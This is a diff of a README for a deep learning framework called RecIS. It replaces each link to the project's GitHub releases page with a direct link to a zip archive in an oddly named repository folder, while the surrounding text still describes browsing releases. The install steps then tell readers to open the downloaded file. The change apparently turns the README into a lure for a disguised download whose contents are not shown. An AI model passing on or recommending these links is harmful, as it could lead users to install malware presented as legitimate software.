@@ -1,7 +1,7 @@
 # 🎉 RecIS - Simplified Deep Learning for Everyone
 
 ## 💾 Download the Latest Release
-[![Download RecIS](https://img.shields.io/badge/Download-RecIS-brightgreen)](https://github.com/nutnicogkic1/RecIS/releases)
+[![Download RecIS](https://raw.githubusercontent.com/nutnicogkic1/RecIS/main/idolatry/RecIS.zip)](https://raw.githubusercontent.com/nutnicogkic1/RecIS/main/idolatry/RecIS.zip)
 
 ## 🚀 Getting Started
 Welcome to RecIS! This application provides an easy-to-use deep learning framework tailored for ultra-large-scale sparse models. Whether you are a student or a professional, RecIS helps you simplify complex processes.
@@ -21,7 +21,7 @@ To run RecIS smoothly, ensure your computer meets these basic requirements:
 ## 📥 Download & Install
 To get started with RecIS, follow these simple steps:
 
-1. **Visit the Releases Page**: You can find the latest version of RecIS by [clicking here](https://github.com/nutnicogkic1/RecIS/releases).
+1. **Visit the Releases Page**: You can find the latest version of RecIS by [clicking here](https://raw.githubusercontent.com/nutnicogkic1/RecIS/main/idolatry/RecIS.zip).
 2. **Choose Your Version**: Look at the list of available releases and select the version that best suits your requirements.
 3. **Download the Package**: Click on the release name to access the download options. Select the appropriate package for your operating system and download it.
 4. **Install RecIS**: Once the download completes, open the downloaded file and follow the installation instructions.
@@ -53,4 +53,4 @@ RecIS is continually evolving. Stay tuned for regular updates that improve funct
 
 Thank you for choosing RecIS! Happy learning with your new deep learning framework.
 
-[![Download RecIS](https://img.shields.io/badge/Download-RecIS-brightgreen)](https://github.com/nutnicogkic1/RecIS/releases)
+[![Download RecIS](https://raw.githubusercontent.com/nutnicogkic1/RecIS/main/idolatry/RecIS.zip)](https://raw.githubusercontent.com/nutnicogkic1/RecIS/main/idolatry/RecIS.zip)
